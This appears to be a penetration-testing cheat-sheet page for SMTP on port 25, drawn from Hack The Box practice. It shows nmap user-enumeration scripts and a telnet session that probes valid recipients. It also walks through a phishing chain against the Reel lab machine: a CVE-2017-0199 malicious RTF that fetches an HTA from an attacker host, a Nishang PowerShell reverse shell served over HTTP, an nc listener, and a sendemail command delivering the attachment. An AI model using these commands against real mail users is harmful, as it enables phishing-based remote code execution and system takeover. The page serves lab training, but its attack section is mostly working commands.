# 25 (SMTP)

## Enumeration

### Scripts

#### nmap

```bash
nmap -p25 --script smtp-commands <IP>
nmap --script smtp-enum-users <IP>
```

### Manual

```bash
telnet <IP> 25
HELO anydomain.com
MAIL FROM: BruceWayne@WayneCorp.com  # Select email address to send from
250 OK
RCPT TO: <nico@megabank.com>  # Specify email address to send to
250 OK  # Verifies the user exists
RCPT TO: <unknown@megabank.com>
550 Unknown User  # Verifies user does not exist
RCPT TO: <random@random.com>
250 OK  # Cannot actually verify as its a different domain

```

Look into sending a malicious document to have the recipient of the email open it and hopefully gain a reverse shell or have the malicious code executed.

#### Example

CVE-2017-0199 RTF file exploit using the Reel machine on Hack The Box.

<pre class="language-bash"><code class="lang-bash"># Generate malicious RTF file
python cve-2017-0199_toolkit.py -M gen -w test.rtf -u http://attacker/test.hta -t RTF -x 0
<strong># Generate malicous HTA file using examples from Out-HTA.ps1
</strong><strong>cd /opt/nishang/Client
</strong><strong>pwsh  # Start up PowerShell on Kali
</strong><strong>.\Out-HTA.ps1
</strong><strong>Out-HTA -PayloadURL http://attacker/test.ps1  # Create new ps1 script file
</strong><strong>
</strong><strong>mv winDef_webInstall.hta /path/to/www
</strong><strong>cp ../CVE-2017-0199/test.rtf /peth/to/www
</strong><strong>cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1
</strong><strong>mv /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 test.ps1  # Move Invoke-PowerShellTcp -Reverse to the bottom of the script
</strong><strong>python3 -m http.server 80
</strong><strong>nc -lvnp 9001
</strong><strong>
</strong><strong>sendemail -f test@megabank.com -t nico@megabank.com -u RTF -m "Please conver this" -a test.rtf -s 10.10.10.77
</strong><strong># Wait for reverse shell</strong></code></pre>

